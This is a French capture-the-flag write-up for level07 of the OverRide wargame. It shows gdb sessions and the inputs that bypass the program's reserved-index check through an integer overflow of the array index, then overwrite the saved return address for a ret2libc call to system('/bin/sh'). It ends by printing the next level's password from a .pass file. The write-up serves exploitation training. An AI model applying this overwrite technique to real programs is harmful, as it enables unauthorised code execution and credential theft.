@@ -1,0 +1,197 @@
+Nous pouvons stocker des nombres en mémoire via un tableau de "unsigned int". Mais certaines adresses sont protégées (les index du tableau divisible par 3 notamment).
+
+Puisque l'on peut stocker des nombres en mémoire, l'idée serait de stocker l'adresse d'un SHELLCODE dans un eip sauvegardé.
+
+
+Trouvons d'abord l'adresse où l'eip de retour du main est sauvegardé:
+
+-----
+
+(gdb) disass main
+Dump of assembler code for function main:
+   0x08048723 <+0>:	push   ebp
+   0x08048724 <+1>:	mov    ebp,esp
+...
+   0x080489ef <+716>:	pop    edi
+   0x080489f0 <+717>:	pop    ebp
+=> 0x080489f1 <+718>:	ret
+
+Breakpoint 1 at 0x80489f1
+(gdb) r
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: quit
+
+Breakpoint 1, 0x080489f1 in main ()
+(gdb) x $esp
+0xffffd6fc:	0xf7e45513
+
+-----
+
+L'adresse où l'on doit réécrire est 0xffffd6fc.
+
+
+Cherchons maintenant l'index du tableau qui nous permettra d'écrire à cette adresse :
+
+-----
+
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 424242
+ Index: 1
+
+Breakpoint 2, 0x080486c8 in store_number ()
+(gdb) disass store_number
+Dump of assembler code for function store_number:
+   0x08048630 <+0>:	push   ebp
+   0x08048631 <+1>:	mov    ebp,esp
+   0x08048633 <+3>:	sub    esp,0x28
+   0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
+	...
+=> 0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8] ;adresse du tableau stocké en ebp+0x8
+   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
+   0x080486d0 <+160>:	mov    eax,0x0
+   0x080486d5 <+165>:	leave
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+(gdb) x $ebp+0x8
+0xffffd510:	0xffffd534
+
+(gdb) p 0xffffd6fc - 0xffffd534
+$1 = 456
+-----
+
+L'adresse du tableau est en "0xffffd534" soit 456 octets avant notre eip. Un unsigned int étant de taille 4 octets, nous devons écrire à l'index 456/4 = 114.
+
+Problème : cet index est protégé : 
+
+-----
+
+Input command: store
+ Number: 1
+ Index: 114
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+
+-----
+
+
+Afin de connaitre l'adresse où stocker une valeur dans le tableau, le calcul suivant est effectué :
+
+"adrese du tableau" + 4 * "index".
+
+Nous pouvons ici tenter d'overflow la multiplication "4 * index", de manière à ce que celle-ci soit égale à 456 (rappel : l'adresse de l'eip est 456 octets plus loin).
+
+00000000000000000000000001110010 = 114
+01000000000000000000000001110010 = 1073741938
+11000000000000000000000001110010 = 3221225586
+
+Lors d'un décalage de 2 bits vers la gauche (* 2^2 = 4), c'est trois nombres donnerons 456.
+
+Nous nous rendons compte que l'appel d'un shellcode est impossible, nous allons devoir tenter la méthode du "ret2libc".
+
+Trouvons d'abord l'adresse da fonction "system" :
+
+----
+
+(gdb) p system
+$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p 0xf7e6aed0
+$4 = 4159090384
+----
+
+Cherchons maintenant si la chaine "/bin/sh" est diponible dnas le binaire:
+
+----
+
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) p 0xf7f897ec
+$3 = 4160264172
+
+----
+
+
+Parfait ! Nous connaissons l'index sur lequel réécrire et nous avons les adresses de la fonction "system" et d'une string "/bin/sh". L'adresse de cette dernière devra etre stocké 2 DWORD plus loin afin de laisser place à l'adresse de retour de "system". Soit à l'index 116 :
+
+
+---
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$
+Segmentation fault (core dumped)
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ cd ../level08
+$ cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+---
+
+
+
